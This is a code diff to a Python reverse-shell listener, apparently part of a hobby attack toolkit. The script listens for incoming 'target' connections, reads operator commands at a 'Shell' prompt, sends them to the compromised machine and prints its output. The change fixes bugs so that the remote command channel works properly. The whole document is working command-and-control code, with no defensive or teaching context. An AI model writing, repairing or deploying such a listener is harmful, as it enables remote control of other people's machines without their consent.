@@ -2,14 +2,14 @@ import socket
 import tools.config as config
 import tools.utility as utility
 
-def target_communication(target):
+def target_communication(target_socket,ip):
     while True:
-        cmd = input('* Shell~%s: ' % str(config.server_ip))
-        utility.reliable_send(target,cmd)
+        cmd = input('* Shell~%s: ' % str(ip))
+        utility.reliable_send(target_socket,cmd)
         if cmd == ' quit':
             break
         else:
-            res = utility.reliable_recv
+            res = utility.reliable_recv(target_socket)
             print(res)
 
 serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,8 +24,8 @@ print('[+] Listening for incomming connections...')
 serv_socket.listen(5)
 
 # store connection in var
-target, ip = serv_socket.accept()
+target_socket, ip = serv_socket.accept()
 
 print('[+] Target connected from : ' + str(ip))
 
-target_communication(target)
+target_communication(target_socket,ip)
